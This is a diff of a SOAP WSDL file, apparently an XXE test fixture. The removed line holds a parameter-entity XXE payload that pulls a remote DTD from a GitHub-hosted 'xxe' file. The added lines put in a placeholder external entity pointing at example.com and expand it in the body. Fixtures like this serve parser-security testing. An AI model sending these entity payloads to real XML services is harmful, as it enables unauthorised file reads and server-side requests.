@@ -1,12 +1,14 @@
- <?xml version="1.0" encoding="UTF-8" ?><!DOCTYPE x [<!ENTITY % foo SYSTEM "https://raw.githubusercontent.com/akshatmahla/xxe/main/xxe2.xml">%foo;
-%param1;]><definitions name="EndorsementSearch"
+<!DOCTYPE example [
+<!ENTITY ext SYSTEM "http://example.com/external.dtd">
+]>
+<definitions name="EndorsementSearch"
   targetNamespace="http://namespaces.test.ttt"
   xmlns:es="http://www.test.ttt/EndorsementSearch.wsdl"
   xmlns:esxsd="http://schemas.test.ttt/EndorsementSearch.xsd"
   xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/"
   xmlns="http://schemas.xmlsoap.org/wsdl/">
    <portType name="GetEndorsingBoarderPortType">
-  </portType>
+  </portType><example>&ext;</example>
   <binding name="EndorsementSearchSoapBinding" type="es:GetEndorsingBoarderPortType">
   </binding>
   <service name="EndorsementSearchService">
